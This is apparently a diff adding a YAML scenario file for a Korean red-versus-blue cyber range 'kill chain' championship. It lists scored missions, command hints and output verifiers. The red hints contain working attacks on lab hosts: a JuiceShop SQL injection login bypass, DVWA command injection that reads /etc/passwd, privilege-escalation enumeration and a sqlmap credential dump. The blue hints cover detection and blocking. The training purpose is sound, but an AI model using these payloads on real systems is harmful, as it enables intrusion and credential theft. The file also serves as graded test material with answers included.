@@ -1,0 +1,152 @@
+id: "championship"
+title: "종합 대전: 전체 킬체인"
+description: "최종 챔피언십 대전이다. Red Team은 정찰부터 데이터 탈취까지 사이버 킬체인의 전체 단계를 수행해야 한다. Blue Team은 각 단계를 실시간으로 탐지하고 차단하며, 최종적으로 인시던트 보고서를 작성할 수 있는 수준의 포렌식 증거를 확보해야 한다. 양 팀 모두 시간 내에 최대한 많은 미션을 완수하라."
+difficulty: "hard"
+time_limit: 3600
+battle_type: "1v1"
+
+red_missions:
+  - order: 1
+    instruction: "[정찰] 전체 인프라(10.20.30.0/24)의 호스트와 서비스를 스캔하라."
+    hint: "nmap -sV -p 22,80,443,3000,8080,1514,1515,9200 10.20.30.0/24 --max-retries 1 --host-timeout 15s -T4"
+    points: 10
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "open"
+
+  - order: 2
+    instruction: "[정찰] 웹 서버의 기술 스택과 취약점을 상세 조사하라."
+    hint: "whatweb http://10.20.30.80 http://10.20.30.80:3000 http://10.20.30.80:8080 && nikto -h http://10.20.30.80:8080 -maxtime 60s 2>&1 | tail -20"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "Server:"
+
+  - order: 3
+    instruction: "[침투] JuiceShop SQLi로 관리자 인증을 우회하고 토큰을 획득하라."
+    hint: "curl -s -X POST http://10.20.30.80:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"' or 1=1--\",\"password\":\"a\"}'"
+    points: 20
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "token"
+
+  - order: 4
+    instruction: "[침투] DVWA Command Injection으로 시스템 접근 권한을 확보하라."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;id;whoami;cat+/etc/passwd|head+-5&Submit=Submit'"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "root"
+
+  - order: 5
+    instruction: "[권한상승] SUID 파일과 sudo 설정을 탐색하여 권한 상승 경로를 식별하라."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;find+/usr+-perm+-4000+-type+f+2>/dev/null|head+-10;sudo+-l+2>&1|head+-5&Submit=Submit'"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "/usr"
+
+  - order: 6
+    instruction: "[측면이동] 내부 호스트(SIEM, 보안장비)로의 접근 가능성을 확인하라."
+    hint: "nmap -sV -p 22,443,1514,9200 10.20.30.1 10.20.30.100 --max-retries 1 --host-timeout 15s -T4"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "10.20.30"
+
+  - order: 7
+    instruction: "[데이터탈취] 데이터베이스를 덤프하고 사용자 크리덴셜을 추출하라."
+    hint: "sqlmap -u 'http://10.20.30.80:8080/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='security=low; PHPSESSID=test' --batch -T users --dump 2>&1 | tail -20"
+    points: 20
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "admin"
+
+  - order: 8
+    instruction: "[은폐] 로그 변조와 흔적 삭제를 시도하라."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;echo+attack_complete+>+/tmp/red_flag;echo+killchain_complete&Submit=Submit'"
+    points: 10
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "killchain_complete"
+
+blue_missions:
+  - order: 1
+    instruction: "[탐지-정찰] suricata에서 네트워크 스캔 활동을 탐지하라."
+    hint: "tail -30 /var/log/suricata/fast.log | grep '10.20.30.201'"
+    points: 10
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: "10.20.30.201"
+
+  - order: 2
+    instruction: "[탐지-침투] Apache 로그와 ModSecurity에서 SQLi/Command Injection을 탐지하라."
+    hint: "grep -iE 'sql|union|exec|cmd|vulnerabilities' /var/log/apache2/access.log | tail -20"
+    points: 15
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "vulnerabilities"
+
+  - order: 3
+    instruction: "[차단] nftables로 공격자 IP를 즉시 차단하고 로깅하라."
+    hint: "nft add rule inet filter input ip saddr 10.20.30.201 log prefix '\"CHAMP-BLOCK: \"' drop"
+    points: 15
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: ""
+
+  - order: 4
+    instruction: "[차단] 웹 서버에서 악성 파일을 탐지하고 제거하라."
+    hint: "find /var/www /tmp -name '*.php' -newer /var/log/apache2/error.log -ls 2>/dev/null; grep -rl 'system\\|shell_exec' /var/www/ 2>/dev/null"
+    points: 15
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: ""
+
+  - order: 5
+    instruction: "[분석] Wazuh에서 전체 공격 관련 알림을 수집하라."
+    hint: "cat /var/ossec/logs/alerts/alerts.json | tail -50 | grep -iE 'alert|rule'"
+    points: 10
+    target_vm: siem
+    verify:
+      type: "output_contains"
+      expect: "rule"
+
+  - order: 6
+    instruction: "[분석] suricata eve.json에서 공격자의 전체 활동 타임라인을 재구성하라."
+    hint: "grep '10.20.30.201' /var/log/suricata/eve.json | python3 -c \"import sys,json; [print(json.loads(l).get('timestamp','')[:19], json.loads(l).get('event_type','')) for l in sys.stdin]\" 2>/dev/null | sort | tail -30"
+    points: 15
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: ""
+
+  - order: 7
+    instruction: "[복구] Apache를 재시작하고 서비스 정상 동작을 확인하라."
+    hint: "systemctl restart apache2 && curl -s -o /dev/null -w '%{http_code}' http://localhost && echo ' - Service restored'"
+    points: 15
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "Service restored"
+
+  - order: 8
+    instruction: "[보고] nftables 최종 룰셋을 확인하여 방어 상태를 검증하라."
+    hint: "nft list ruleset | head -40"
+    points: 15
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: "table"
